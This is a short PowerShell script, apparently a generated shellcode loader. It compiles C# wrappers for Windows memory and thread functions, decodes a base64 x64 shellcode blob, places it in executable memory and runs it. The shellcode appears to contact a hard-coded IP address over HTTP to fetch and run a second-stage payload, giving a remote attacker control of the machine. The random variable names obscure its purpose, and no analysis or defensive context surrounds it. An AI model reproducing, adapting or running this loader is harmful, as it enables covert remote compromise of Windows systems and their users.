Set-StrictMode -Version 2
$cHSch = @"
	using System;
	using System.Runtime.InteropServices;
	namespace rw {
		public class func {
			[Flags] public enum AllocationType { Commit = 0x1000, Reserve = 0x2000 }
			[Flags] public enum MemoryProtection { ExecuteReadWrite = 0x40 }
			[Flags] public enum Time : uint { Infinite = 0xFFFFFFFF }
			[DllImport("kernel32.dll")] public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
			[DllImport("kernel32.dll")] public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
			[DllImport("kernel32.dll")] public static extern int WaitForSingleObject(IntPtr hHandle, Time dwMilliseconds);
		}
	}
"@

$nwPP2 = New-Object Microsoft.CSharp.CSharpCodeProvider
$fB = New-Object System.CodeDom.Compiler.CompilerParameters
$fB.ReferencedAssemblies.AddRange(@("System.dll", [PsObject].Assembly.Location))
$fB.GenerateInMemory = $True
$iJa5 = $nwPP2.CompileAssemblyFromSource($fB, $cHSch)

[Byte[]]$jd = [System.Convert]::FromBase64String("/EiD5PDozAAAAEFRQVBSUVZIMdJlSItSYEiLUhhIi1IgSItyUEgPt0pKTTHJSDHArDxhfAIsIEHByQ1BAcHi7VJBUUiLUiCLQjxIAdBmgXgYCwIPhXIAAACLgIgAAABIhcB0Z0gB0FCLSBhEi0AgSQHQ41ZI/8lBizSISAHWTTHJSDHArEHByQ1BAcE44HXxTANMJAhFOdF12FhEi0AkSQHQZkGLDEhEi0AcSQHQQYsEiEgB0EFYQVheWVpBWEFZQVpIg+wgQVL/4FhBWVpIixLpS////11IMdtTSb53aW5pbmV0AEFWSInhScfCTHcmB//VU1NIieFTWk0xwE0xyVNTSbo6VnmnAAAAAP/V6A8AAAA3MS4xOTMuMTU5LjI0NABaSInBScfAAwQAAE0xyVNTagNTSbpXiZ/GAAAAAP/V6IgAAAAvVmwzMmxJN1lLUUpRVjFGVkNvYnpYdzNhYjQ2djBEXzltd3JMS0wxal9tYWJJMFNELTFCVVFBUnlpdGVxT3pHU3U3R09WU2U2STZGaWpMeDk3R2hTaGVhamxuQzh6SThRdDVPNXFTa19jTFpqa1FOUFhUUjJoXzh5YnM5MFZaempGSzFjUHgASInBU1pBWE0xyVNIuAACIIQAAAAAUFNTScfC61UuO//VSInGagpfU1pIifFNMclNMclTU0nHwi0GGHv/1YXAdR9Ix8GIEwAASbpE8DXgAAAAAP/VSP/PdALrzOhVAAAAU1lqQFpJidHB4hBJx8AAEAAASbpYpFPlAAAAAP/VSJNTU0iJ50iJ8UiJ2knHwAAgAABJiflJuhKWieIAAAAA/9VIg8QghcB0smaLB0gBw4XAddJYw1hqAFlJx8LwtaJW/9U=")

$bfcT = [rw.func]::VirtualAlloc(0, $jd.Length + 1, [rw.func+AllocationType]::Reserve -bOr [rw.func+AllocationType]::Commit, [rw.func+MemoryProtection]::ExecuteReadWrite)
if ([Bool]!$bfcT) { $global:result = 3; return }
[System.Runtime.InteropServices.Marshal]::Copy($jd, 0, $bfcT, $jd.Length)
[IntPtr] $qu = [rw.func]::CreateThread(0,0,$bfcT,0,0,0)
if ([Bool]!$qu) { $global:result = 7; return }
$zcFd = [rw.func]::WaitForSingleObject($qu, [rw.func+Time]::Infinite)
